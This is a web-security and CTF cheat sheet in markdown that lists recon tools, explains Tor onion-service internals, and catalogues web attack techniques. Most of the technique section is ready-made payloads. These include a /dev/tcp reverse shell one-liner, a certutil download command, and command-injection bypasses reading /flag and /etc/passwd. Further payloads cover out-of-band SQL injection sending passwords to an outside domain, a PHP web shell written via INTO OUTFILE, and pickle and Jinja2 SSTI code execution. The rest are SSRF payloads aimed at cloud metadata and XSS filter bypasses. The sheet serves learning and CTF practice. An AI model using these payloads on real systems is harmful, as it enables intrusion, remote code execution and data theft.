# Web
> [WEB CTF CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet/blob/master/README.md#%E7%A9%BA%E7%99%BD%E7%B9%9E%E9%81%8E)  
> [Web Security CheatSheet](https://blog.p6.is/Web-Security-CheatSheet/)  
> [Basic Concept of Penetration Testing](https://hackmd.io/@boik/ryf5wZM5Q#/)  
> [Awesome Web Security](https://github.com/qazbnm456/awesome-web-security)  
> [Basic concept of Penetration Testing](https://hackmd.io/@boik/ryf5wZM5Q?type=slide#/)  
> [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/index.html)
> [OWASP WSTG](https://owasp.org/www-project-web-security-testing-guide/stable/)  
> [PortSwigger Web Security Academy](https://portswigger.net/web-security)


## Tool


### Recon
- Target
  - [SHODAN](https://www.shodan.io/)
    > Search Engine for the Internet of Everything
  - [Censys](https://search.censys.io/)
    > Censys helps organizations, individuals, and researchers find and monitor
    > every server on the Internet to reduce exposure and improve security
  - Google Hacking
    - [Google Hacking Database](https://www.exploit-db.com/google-hacking-database)
- Site Information
  - maltego
  - [Netcraft Site Report](https://sitereport.netcraft.com/)
  - [crt.sh](https://crt.sh/)
    > Enter an Identity (Domain Name, Organization Name, etc)
  - [IANA WHOIS Service](https://www.iana.org/whois)
  - [DomainTools](https://whois.domaintools.com/)
- DNS
  - drill
  - dig
  - nslookup
  - host
  - dnsenum
  - knockpy.py
  - [dnsdumpster](https://dnsdumpster.com/)
  - [robtex](https://www.robtex.com/)
    - Subdomains
- Crawler
  - dirb
  - DirBuster
  - git-dumper
  - wfuzz
    ```bash
    wfuzz -c -z file,/raft-large-files.txt -hc 404 "${URL}"
    ```
  - ffuf


### Payload
- Burpsuit
- [Exploit DB](https://www.exploit-db.com/)
- c-jwt-cracker
- Scanner
  - sqlmap
  - xsser
  - ZAP
- Backdoor
  - weevely
  - veil
  - BeEF
- Reverse Shell
  - `/bin/sh -i >& /dev/tcp/<HOST>/<PORT> 0<&1`
  - [reverse ICMP shell (icmpsh)](https://github.com/bdamele/icmpsh)


### Connection
- `/dev/tcp/<HOST>/<PORT>`
- telnet
- nc / ncat / socat
- `$ certutil.exe -urlcache -f <url> <filename>`
- [HTTPie](https://devhints.io/httpie)


### Public Temp Server
- webhook.site
  - unique URL (https / CORS)
  - unique email
- beeceptor
- hookbin.com
- requestbin.net


## Background

### HTTP Protocol
- [Basics of HTTP](https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Basics_of_HTTP)
  - MIME
    > type/subtype;parameter=value
- [URI schemes](https://en.wikipedia.org/wiki/List_of_URI_schemes)
  - Data URI
    > data:[\<mediatype\>][;base64],\<data\>

### The Onion Routing Protocol (Tor)
> Tor is an overlay network.
> 
> It is composed by thousands (~ 6-11k) **relays**, connected through
> **channels** that form **circuits** inside which **cells** are sent
> and received.
>
> -- <cite>[microlab.red](https://microlab.red/2024/09/03/tor-internals-for-those-of-us-who-also-have-a-life-1-n/)</cite>

> [The Tor Project](https://www.torproject.org/)  
> [TOR internals, for those of us who also have a life (1/n) | microlab.red](https://microlab.red/2024/09/03/tor-internals-for-those-of-us-who-also-have-a-life-1-n/)  
> [TOR internals, for those of us who also have a life (2/n) | microlab.red](https://microlab.red/2024/09/23/tor-internals-for-those-of-us-who-also-have-a-life-2-n/)  
> [Creating a Testing Tor Network From Scratch | dax](https://medium.com/@dax_dev/creating-a-testing-tor-network-from-scratch-e952d76a18cb)  
> [Decentralized Routing in Tor Hidden Services](https://medium.com/@kyodo-tech/decentralized-routing-in-tor-hidden-services-40e0bc0793d5)

- Directory Authority
  > They are a set of specialized servers within the Tor network that
  > collectively generate and distribute a signed document (known as
  > the **consensus**) containing information about all known Tor relays.
  >
  > -- <cite>[The Tor Proejct](https://community.torproject.org/relay/governance/policies-and-proposals/directory-authority/)</cite>

  - [DA List](https://gitlab.torproject.org/tpo/core/tor/-/blob/HEAD/src/app/config/auth_dirs.inc)
  - Consensus
    - `$ curl https://collector.torproject.org/recent/relay-descriptors/consensuses/`
- Tor Circuit
  > ```
  > Tor User → Guard Relay / Bridge Relay → Middle Relay → Exit Relay → Destination (example[.]com)
  > ```
  >
  > -- <cite>[The Tor Project](https://community.torproject.org/relay/types-of-relays/)</cite>

  - Bridge Relay
    - not listed in the public Tor directory
    - use pluggable transports to obfuscate their traffic to make it harder to detect
  - Guard Relay
    - first relay (hop) in a Tor circuit
    - stable and fast
  - Middle Relay
    - concealment
  - Exit Relay
    - Exit Policy
- Onion Hidden Service (.onion)
  ```mermaid
  sequenceDiagram
    actor Client
    participant RP as Rendezvous Point
    participant SD as Hidden Service Directory
    participant IP as Introduction Point
    participant OS as Onion Service

    OS->>IP: estabilish long-term circuit
    activate IP
    OS->>SD: publish service descriptor (introduction point)
    Client->>RP: choose a relay
    activate RP
    Client->>SD: request service descriptor
    Client->>IP: request service (rendezvous point)
    IP->>OS: pass the request
    deactivate IP
    OS->>RP: meet the client
    deactivate RP
  ```
  - Onion Service
    - Period
      ```
      period_number = floor(unix_timestamp / period_length)
      period_length = 1440 min [default 1 day]
      ```

    - Identity Key
      > A 32 bytes ed25519 master key pair.
      ```
      identity_pubkey
      identity_prikey
      ```

    - Blinded Key
      > A daily-rotated identifier derived from **identity_pubkey**
      > related to the **period_number** and **period_length**.
      ```
      blinded_pubkey
      blinded_prikey
      ```

    - Descriptor Key
      > A key pair signed by **blinded_prikey** that is used to sign
      > the service descriptors.

    - Credential & Subcredential
      ```
      CREDENTIAL    = SHA3_256("credential" | identity_pubkey)
      SUBCREDENTIAL = SHA3_256("subcredential" | CREDENTIAL | blinded_pubkey)
      ```

    - Service Address (v3)
      > A 56 bytes long base32 encoded string with ".onion" suffix.
      ```
      service_address = base32(identity_pubkey | CHECKSUM | VERSION) + ".onion"
      CHECKSUM        = blake2b(".onion checksum" | identity_pubkey | VERSION)[:2]
      VERSION         = "\x03"
      ```

  - Hidden Service Directory (HSDir)
    > A subset of Tor relays that store **service descriptors**.

    - Descriptor ID
      > One can determine the HDDir that stores the **service_descripter**
      > from the **identity_pubkey** (embeded in the **service_address**) and the timestamp.
      >
      > Distributed Hash Table (DHT) Model
      > - The first **hsdir_spread_store** relays with the **relay_id**
      >   greater than **descriptor_id** are the target HSDirs.
      > 
      > - Client choose the HSDir randomly from **hsdir_spread_fetch** relays
      >   start from the first match.

      ```
      hsdir_n_replicas    = an integer in range [1, 16] with default value 2.
      hsdir_spread_fetch  = an integer in range [1,128] with default value 3.
      hsdir_spread_store  = an integer in range [1,128] with default value 4.
      shared_random_value = a pre-shared value determined by directory authorities for each period.

      descriptor_id = SHA3-256("stored-at-idx" | blinded_pubkey | hsdir_n_replicas | period_length | period_number)
      relay_id      = SHA3-256("node-idx" | node_identity | shared_random_value | period_number | period_length)
      ```
    - Service Descriptor
      > A service descriptor contains the introduction points, as long
      > as the signature, which can be verified by the pubkey embedded
      > in the service address.
      >
      > [HS-DESC-ENCRYPTION-KEYS](https://spec.torproject.org/rend-spec/hsdesc-encrypt.html#HS-DESC-ENCRYPTION-KEYS)

      - descriptor-lifetime
      - descriptor-signing-key-cert
        > A certificate that is signed by the blinded key to ensure the integrity.
      - superencrypted
        > Data encrypted with a symmetric key derived from **blinded_pubkey**
        > and **SUBCREDENTIAL** to make sure the client knows the **service_address**.
        - auth-client
          > Decrypt information for authenticated users if restricted
          > discovery is enabled.
        - encrypted
          > Data encrypted with a symmetric key derived from **blinded_pubkey**,
          > **subcredentail**, and **descriptor_cookie** (if restricted
          > discovery is enabled, leave blank otherwise)
          - introduction-point
            > Provide 3 relays by default.
      - signature
  - Introduction Point
    > An onion service establishes long-term circuits to 3 different
    > Tor relays, called introduction points, to conceal its location
    > from clients.
    >
    > A client selects one of these introduction points, as listed in
    > the service descriptor, to initiate communication with the
    > service.
  - Rendezvous Point
    - verify secret from both side


## Technique


### Broken Access Control
- Insecure Direct Object References (IDOR)

### Cache Poisoning

### Command Injection
- Basic
  - $ ping 127.0.0.1 `; id`
  - $ ping 127.0.0.1 `| id`
  - $ ping 127.0.0.1 `&& id`
  - $ ping '127.0.0.1`'; id #` ' 
  - $ ping "`$(id)`"
  - $ cat mewo.txt `$(id)`
  - $ cat mewo.txt `` `id` ``
  - Newline (0x0A, \n, %0A)
- Space Bypass
  - $ cat`<TAB>`/flag
  - $ cat\</flag
  - $ {cat,/flag}
  - $ cat$IFS/flag
  - $ X=$'cat\x20/flag'&&$X
- Keyword Bypass
  - $ cat /f'la'g
  - $ cat /f"la"g
  - $ cat /f\l\ag
  - $ cat /f\*
  - $ cat /f?a?
  - $ cat ${HOME:0:1}etc${HOME:0:1}passwd

### CRLF Injection
- Inject `\r\n` to headers

  ```txt
  request("http://host/ HTTP/1.1\r\nHeader: xxx\r\nX:")
  -----------------------------------------------------
  GET / HTTP/1.1\r\n
  Header: xxx
  X:` HTTP/1.1\r\n
  Host: host\r\n
  ...
  ```

  ```txt
  ?redirect=http://example.com/%0d%0a%0d%0a...
  --------------------------------------------
  HTTP/1.1 302 Found
  Content-Length: 35\r\n
  Content-Type: text/html; charset=UTF-8\r\n
  ...
  Location: https://example.com\r\n
  \r\n
  <script>alert(1)</script>
  ...
  Server: Apache/2.4.41\r\n
  \r\n
  Redirecting to <a href="/">/</a> ...
  ```

- Redis

  ```
  http://127.0.0.1:6379/%0D%0ASET%20key%20"value"%0D%0A
  -----------------------------------------------------
  SET key "value"\r\n
  ```

### CSRF
- Cookies Security
  - HttpOnly
  - Secure
  - Domain, Path, SameSite
- HTML Element
  - GET: `<img>`, `<iframe>`, `<form>`
  - POST: `<form>`
- JavaScript
  - GET/POST: `fetch`, `XMLHttpRequest`
- Limitation
  - [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests)
- Mitigation
  - Same-origin policy (SOP)
    - [SameSite cookies explained](https://web.dev/samesite-cookies-explained/)
    - [SameSite Cookie Changes in February 2020: What You Need to Know](https://blog.chromium.org/2020/02/samesite-cookie-changes-in-february.html)
  - CSRF token

### CSS Injection
- expression()
- import URL (CSRF)
  - Referer
  - url(...)

    ```
    body {
      background:
      url(http://example.com/logout);
    }
    ```

  - ...
- CSS Selector
  > Read part of HTML source, like CSRF Token

  ```css
  input[name=csrf][value^="1"]{background:url(http://ip/1)}   X
  input[name=csrf][value^="2"]{background:url(http://ip/2)}   O
  input[name=csrf][value^="2a"]{background:url(http://ip/2a)} X
  input[name=csrf][value^="2e"]{background:url(http://ip/2e)} O
  ...
  <input type="text" name="csrf" avlue="2e58ca...">
  ```

### Deserialization
- ASP.NET Deserialization
  > `ViewState`, `Session`, ... are highly possible to have serialize data
  > encrypted by `machine key` stored in `web.config`.

  - [ysoserial.net](https://github.com/pwntester/ysoserial.net)
- Java
  - Gadgets
    - CommonsCollections
  - Magic Method
    - toString
    - readObject

      ```java
      public class Cat implements Serializable {
        ...
        private vlid readObject(ObjectInputStream in) {
          throws IOException, ClassNotFoundException {
            ...
          }
        }
      }
      ```

    - finalize
    - ...
  - [ysoserial](https://github.com/frohoff/ysoserial)
- PHP
  > Feature removed since PHP 8.0
  - Phar Format
    - stub
    - manifest (... serialized file meta-data, stored in serialize() format ...)
    - contents
    - signature (optional)
  - Magic Method
    - \_\_destruct()
    - \_\_wakeup()
    - \_\_call()
    - \_\_toString()
  - Phar Deserialization`phar://`
    | Trigger               |           |                |
    |:----------------------|:----------|:---------------|
    | file\_get\_contents() | include() | file\_exists() |
    | getimagesize()        | unlink()  | file()         |
    | fopen()               | is\_dir() | ...            |

    - Create phar file by `php --define phar.readonly=0 ${file}`
      ```php
      <?php
        class Cat {}
        $phar = new Phar("pharfile.phar");
        $phar->startBuffering();
        $phar->setStub("<?php __HALT_COMPILER(); ?>");
        $c = new Cat();
        $phar->setMetadata($c);
        $phar->addFromString("meow.txt", "owo");
        $phar->stopBuffering();
      ?>
      ```
  - [POP Chain](https://github.com/ambionics/phpggc)
- Python
  - Magic Method
    - \_\_reduce\_\_()
  - pickle
    > Stack-based virtual pickle machine

    ```python
    class Exploit(object):
      def __reduce__(self):
        return (os.system, ('id', ))

    serialized = pickle.dumps(Exploit())
    pickle.loads(serialized)
    #pickletools.dis(serialized)
    ```

### DOM Clobbering
- Inject HTML into a page to manipulate the DOM to change the behavior of JavaScript on the page
  - Access by `id` directly or by `windows.id`
    ```html
    <any id="a"></any>
    <script>
      console.log(a)
      console.log(window.a)
    </script>
    ```
  - Access by `document.a` additionally
    ```html
    <img name="a">
    <form name="b"></form>
    <embed name="c">
    <object name="d"></object>
    <script>
      console.log(document.a)
      console.log(document.b)
      console.log(document.c)
      console.log(document.d)
    </script>
    ```
  - Access by combination of `id` and `name`
    ```html
    <any id="a"></any>
    <any id="a" name="b"></any>
    <script>
      console.log(a) // HTMLCollection[]
      console.log(a.a)
      console.log(a.b)
    </script>
    ```
  - Access multi-layer windows object
    ```html
    <iframe name="a" srcdoc='
      <iframe name="b" srcdoc="
        <iframe name=&amp;quot;c&amp;quot; srcdoc=&amp;quot;
          <a id=d></a>
        &amp;quot;></iframe>
      "></iframe>
    '></iframe>
    <script>
      console.log(a.b.c.d)
    </script>
    ```

- Case Study
  - [XSS in GMail’s AMP4Email via DOM Clobbering](https://research.securitum.com/xss-in-amp4email-dom-clobbering/)

### HTTP Desync Attacks

### Local File Inclusion (LFI)
- RCE
  - [PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator)
  - access.log / error.log
  - /proc/self/environ `user-agent`
  - phpinfo `tmp file location`
  - /tmp/sess\_{session\_name} `control session content`
  - [session.upload\_progress](https://blog.orange.tw/2018/10/#session-tragedy)
- Trigger `php`
  - require()
  - require\_once()
  - include()
  - include\_once()
- Stream Wrapper
  - `php://filter/<action><filter>/resource=<file>`
    | action    | filter                   |
    |:----------|:-------------------------|
    | \<empty\> | convert.base64-encode    |
    | read=     | string.rot13             |
    | write=    | zlib.deflate             |
    |           | zlib.inflate             |

    ```
    Multiple Filter
    ---------------
    php://filter/read=convert.base64-encode/
                 read=string.rot13/
                 ...
                 resource=phpinfo.php
    ```

  - `php://input`
  - `php://fd`
- Sensitive Files
  - Source Code
  - Version Contorl
    - [.git](https://github.com/arthaud/git-dumper)
    - .svn
    - .bzr
  - Hidden File
    - [.DS\_Store](https://github.com/lijiejie/ds_store_exp)
    - .index.php.swp
  - Unix
    - /etc/hosts
    - /etc/passwd
    - /etc/shadow
    - /proc/net/[tcp,udp]
    - /proc/net/\*
    - /proc/net/arp
    - /proc/net/fib\_trie
    - /proc/net/route
    - /proc/sched\_debug
    - /proc/self/cwd
    - /proc/self/environ
    - /proc/self/exe
    - /proc/self/fd/[num]
  - Web Server Config Files
    - /etc/apache2/apache2.conf
    - /etc/apache2/sites-available/000-default.conf
    - /etc/nginx/nginx.conf
    - /etc/php/php.ini
- Path Bypass
  - Encoding
    | Encoding                        | Payload   | Decode |
    |:--------------------------------|:----------|:-------|
    | unicode/UTF-8 encoding          | %c1%1c    |        |
    |                                 | %c0%af    |        |
    | unicode/UTF-7 encoding          |           |        |
    | overlong UTF-8 unicode encoding | %c0%2e    | `.`    |
    |                                 | %e0%40%ae | `.`    |
    |                                 | %c0ae     | `.`    |
    |                                 | %c0%af    | `/`    |
    |                                 | %e0%80%af | `/`    |
    |                                 | %c0%2f    | `/`    |
    |                                 | %c0%5c    | `\`    |
    |                                 | %c0%80%5c | `\`    |
    | URL encoding                    | %2e%2e%2f | `../`  |
    |                                 | %2e%2e/   | `../`  |
    |                                 | ..%2f     | `../`  |
    |                                 | %2e%2e%5c | `..\`  |
    | double URL encoding             | %252F     | `/`    |
    |                                 | %255C     | `\`    |
    | 16-bit Unicode encoding         | %u002e    | `.`    |
    |                                 | %u2215    | `/`    |
    |                                 | %u2216    | `\`    |
  - Null Bytes
    > bypass file type checking

    - `../../../../../passwd%00.jpg`
  - Mangled Paths
    > bypass removing traversal sequences

    - `....//`
    - `...\//`
    - `..//..//..\`        
  - Nginx Misconfiguration
    > Nginx off-by-slash fail
    >
    > `http://127.0.0.1/static../settings.py` => `/home/app/static/../settings.py`
    
    ```
    location /static {
      alias /home/app/static/;
    }
    ```

- Extension Bypass
  - pHP
  - pht, phtml, php[3,4,5,7]
  - html, svg
  - Apache2 Feature
    > xxx.abc => run as php file

    ```
    .htaccess
    ---------
    <FilesMatch "abc">
      SetHandler application/x-httpd-php
    </FilesMatch>
    ```

        
### Prototype Pollution
- `a = new A()`
  - `a`.  \_\_proto\_\_ === `A`.prototype
- `undefined` may be replaced when its prototype has the attribute.
- Trigger
  - Set
    - [lodash](https://snyk.io/vuln/SNYK-JS-LODASH-608086) (\_.setWidth, \_.set)
  - Merge / Extend
    - CVE-2019-11358 (jQuery $.extend)
  - Clone
- Prototype Chain
  > When finding a property, JavaScript will go through the Prototype
    Chain until \_\_proto\_\_ is null.

  ```javascript
  > a = []
  > b = []
  > a["__proto__"]["test"] = "testtest" // a["__proto__"] is array
  > b.test
  < "testtest"
  ```
- Case Study
  - [MITRE](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=prototype+pollution)
  - [HackerOne XSS](https://hackerone.com/reports/986386)
  - [CVE-2019-7609](https://slides.com/securitymb/prototype-pollution-in-kibana)
  - [Client-Side Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution)
  - [Exploiting Client-Side Prototype Pollution in the wild](https://blog.s1r1us.ninja/research/PP)

### SQL Injection
- Type
  > Prevent: Parameterized Query, Prepared Statement

  - Union Based
  - Blind
    - Boolean Based

      ```
      ... id = 1 and length(user()) > 0
      ... id = 1 and length(user()) > 16
      ... id = 1 and ascii(mid(user(),1,1)) > 0
      ... id = 1 and ascii(mid(user(),1,1)) > 80
      ```

    - Time Based
      - sleep

        ```
        ... id = 1 and IF(ascii(mid(user(),1,1))>0, SLEEP(10), 1)
        ... id = 1 and IF(ascii(mid(user(),1,1))>80, SLEEP(10), 1)
        ```

      - query / large calculation data
      - repeat('A', 10000)
  - Error
    - ExtractValue(xml, xpath)

      ```
      SELECT ExtractValue(1, concat(0x0a,version()));
      -----------------------------------------------
      XPATH syntax error:'
      8.0.20'
      ```

    - UpdateXML(xml, xpath, new\_xml)
    - exp(x)
    - MultiLineString(LineString)
    - MultiPolygon(Polygon)
  - Out-of-Band
    | DB              | Payload                                                                 | Comment   |
    |:----------------|:------------------------------------------------------------------------|:----------|
    | MySQL + Windows | `load_file(concat("\\\\", password, ".splitline.tw"))`                  | DNS Query |
    |                 | SMB + DNS query log ([DNSBin](https://github.com/ettic-team/dnsbin))    |           |
    | Oracle          | `url_http.request('http://splitline.tw/' \|\| (SELECT user FROM dual))` |           |
  - Multi Byte SQL Injection
- Read / Write File
  - `SELECT LOAD_FILE('/etc/passwd')` (MySQL)
  - `SELECT pg_read_file('/etc/passwd', <offset>, <length>)` (PostgresSQL)
  - `SELECT "<?php eval($_GET[x]);?>" INTO OUTFILE "/var/www/html/shell.php"` (MySQL)
- Common Function
  | DB     | Function          |                 |           |            |          |
  |:-------|:------------------|:----------------|:----------|:-----------|:---------|
  | MySQL  | user()            | current\_user() | version() | database() | schema() |
  |        | group\_concat()   |                 |           |            |          |
  | Oracle | url\_http.request |                 |           |            |          |
- Special Table
  | DB           | Payload                                                             | Comment   |
  |:-------------|:--------------------------------------------------------------------|:----------|
  | MySQL >= 5.0 | `SELECT schema_name FROM information_schema.schemata;`               | Databases |
  |              | `SELECT table_name FROM information_schema.tables WHERE table_schema = '<database>';`                  | Tables    |
  |              | `SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = '<database>' AND table_name = '<table>'`  | Columns   |

### SSRF
> [SSRF bible Cheatsheet](https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf)

- Scheme
  > [URL schema support](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#bookmark=id.osggnj3pn7l6)

  - HTTP
    - Docker API  
      `http://IP:2375/images/json`
    - Cloud Metadata (GCP)  
      `http://metadata.google.internal/computeMetadata/v1/...`
    - Cloud Metadata (AWS)  
      `http://169.254.169.254/latest/user-data/...`
  - Gopher
    > Generate arbitrary TCP packet under no interaction.
    >
    > `gopher://<authority>/<padding><tcp payload>`

    - [Gopher Payload Generator](https://github.com/tarunkant/Gopherus)
    - HTTP GET/POST  
      `gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0D%0AHost:127.0.0.1%0D%0A%0D%0A`
    - MySQL (must without password)  
      [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)
    - Redis  
      `gopher://127.0.0.1:6379/_SET%20key%20"value"%0D%0A`
    - PHP-FPM
  - Local File
    - `file:///etc/passwd`
    - `file://localhost/etc/passwd`
    - `python` `local_file:///etc/passwd`
    - `java` `file:///var/www/html/`
    - `java` `netdoc:///var/www/html/`
- Authority
  - localhost
    - 127.0.0.1
    - localhost
    - 127.0.1
    - 127.1
    - 0.0.0.0
    - 0
  - IP Address
    - 2130706443 (dec)
    - 0x7f00000001 (hex)
    - 0x7f.0x0.0x0.0x1
    - 0177000000001 (oct)
    - 0177.0.0.01
  - IPv6
    - ::1
    - ::127.0.0.1
    - ::ffff:127.0.0.1
    - ::
    - ip6-localhost
  - IDN Encoding
    - http://www.unicode.org/reports/tr46/  
    - [Domain Obfuscator](https://splitline.github.io/domain-obfuscator/)
    - http://ⓀⒶⒾⒷⓇⓄ.ⓉⓌ
  - Domain Name Binding
    - whatever.localtest.me
    - 127.0.0.1.xip.io
  - DNS Rebinding (Round-Robin DNS)
    - foo.bar.10.0.0.1.xip.io
    - A.54.87.54.87.1time.127.0.0.1.forever.rebind.network
    - 36573657.7f000001.rbndr.us
  - 302 Bypass
    > If the environment does not block http redirect, query your own web server which respond
    >
    > ```php
    > <?php
    >   Header("Locathon: gopher://127.0.0.1:9000/_...")
    > ?>
    > ```
  - URL Parser
    - `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/`
      | 1.1.1.1 | 2.2.2.2  | 3.3.3.3 |
      |:-------:|:--------:|:-------:|
      | urllib2 | requests | urllib  |
      | httplib |          |         |
- Case Study
  - [$1.000 SSRF in Slack](https://elbs.medium.com/1-000-ssrf-in-slack-7737935d3884)
  - [A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

### SSTI
- Identify Template Engine
  ![](https://miro.medium.com/max/701/1*3hIShkWH_gjOt1b0LNPURQ.png)
- Jinja2
  > [Flask default template engine (doc)](https://jinja.palletsprojects.com/en/3.1.x/)  
  > [Exploiting Jinja SSTI with limited payload size.](https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti/)  
  > [GreHack 2021 - Optimizing Server Side Template Injections payloads for jinja2](https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/)  
  > [RCE-bypassing-as-much-as-I-possibly-can](https://hackmd.io/@Chivato/HyWsJ31dI#RCE-bypassing-as-much-as-I-possibly-can)  
  > [On SSTI & bypass of jinja2](https://chowdera.com/2020/12/20201221231521371q.html)  
  > [Builtin Filters](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f)

  - Get `os`
    - `{{lipsum.__globals__.os}}`
    - `{{cycler.__init__.__globals__.os}}`
  - Load `os`
    - `{{config.from_object('os')}}`
  - `{{ config }}`
    - config.SECRET\_KEY
    - config.from\_pyfile(filename)
  - `{{ request }}`
    - request.args.name
    - request.cookies.name
    - request.headers.name
    - request.values.name
    - request.form.name
  - sandbox bypass

    ```python
    #All the below payloads works under python2
    --------------------------------------------

    #Starting from string or list
    {{ ''.__class__.__base__ }}

    #File operation
    {{ ''.__class__.__mro__[2].__subclasses__() }}
    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/app/a.txt').write('test') }}
    
    #RCE
    {{ ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read() }}
    > uid=1000(ubuntu)gid=1000(ubuntu)...

    #All the below payloads works under python3
    --------------------------------------------
    {{ ().__class__.__base__.__subclasses__() }}
    {{ ().__class__.__base__.__subclasses__()[132] }} #<class 'os._wrap_close'>
    {{ ().__class__.__base__.__subclasses__()[132].__init__.__globals__ }}
    {{ ().__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('id') }}

    #Find eval
    {% for c in [].__class__.__base__.__subclasses__(): %}
      {% if c.__name__ == 'catch_warnings': %}
        {% for b in c.__init__.__globals__.values(): %}
          {% if b.__class__ == {}.__class__ %}
            {% if 'eval' in b.keys(): %}
              {{ b['eval']('__import__("os").popen("id").read()') }}
            {% endif %}
          {% endif %}
        {% endif %}
      {% endif %}
    {% endfor %}

    #Import
    {% for x in ().__class__.__base__.__subclasses__() %}
      {% if "warning" in x.__name__ %}
        {{x()._module.__builtins__["__import__"]("os").popen(request.args.payload).read()}}
      {% endif %}
    {% endfor %}
    ```

  - Bypass
    - `.`

      ```txt
      /?ssti={{libsum['__globals__']['os']}}
      ```

    - `.` `_`

      ```txt
      /?ssti={{lipsum['\x5f\x5fglobals\x5f\x5f']['os']}}
      ```

    - `.` `_` `[` `]`

      ```txt
      /?ssti={{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('os')}}
      ```

    - `.` `_` `[` `]` `|`

      ```txt
      /?ssti={{getattr(getattr(lipsum,'\x5f\x5fglobals\x5f\x5f'), 'os')}}
      ```

    - `.` `_` `[` `]` `{{` `}}`

      ```txt
      /?ssti={%if lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('os') %}{%endif%}
      ```

    - length or other special characters (`'` `"`)

      ```txt
      /?ssti={{lipsum[request.args.param1][request.args.param2]}}&param1=__globals__&param2=os

      /?ssti={{config.update(payload=request.args.param1)}}&param1=ls
      /?ssti={{lipsum.__globals__.os.popen(config.payload)}}
      ```
- Ruby erb
  - `<%= system('id') %>`
- PHP Smarty
  - `{ system('id') }`
- PHP Twig
  - `{{ ['id'] | filter('system') }}`
- Node.js ejs
  - `<%= global.process.mainModule.require("child_process").execSync("id").toString() %>`
- Format String Attack

### XS-Leaks
> [XS-Leaks Wiki](https://xsleaks.dev/)
> [xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)  

- Browser-based side channel attack  

### XSS
> [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

- Type
  - Self-XSS
  - Reflected XSS
  - Stored XSS
- Mitigation
  - Filter
    | Pattern       | Bypass                                     |
    |:--------------|:-------------------------------------------|
    | [SPACE]on...= | <svg`<TAB>`onload=alert(1)>                |
    | [SPACE]on...= | <svg`\n`onload=alert(1)>                   |
    | [SPACE]on...= | <svg/ onload=alert(1)>                     |
    | javascript:   | `<a href="\x01javascript:alert(1)">X</a>`  |
    | javascript:   | `<a href="java\tscript:alert(1)">X</a>`    |
    | javascript:   | `<a href="java&Tab;script:alert(1)">X</a>` |
    | <script       | JSFuck                                     |
  - Escape (HTML Entity)
    | Symbol | Alternative |
    |:-------|:------------|
    | `<`    | `&lt;`      |
    | `>`    | `&gt;`      |
    | `"`    | `&quot;`    |
  - Content Security Policy (CSP)
    > [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
    - script-src
    - Nonce
  - trusted-types (Chrome)
  - HTTP response header
  - Define trusted resources
  - HttpOnly
- Bypass
  - `<base>`
    - Change base URL of all relative URL
  - Relative Path Overwrite (RPO)
- Case Study
  - [XS-Search abusing the Chrome XSS Auditor](https://www.youtube.com/watch?v=HcrQy0C-hEA)
  - [Mutation XSS in Google Search](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/)
  - [Breaking XSS mitigations via Script Gadgets](https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf)

### XXE (XML External Entity Injection)
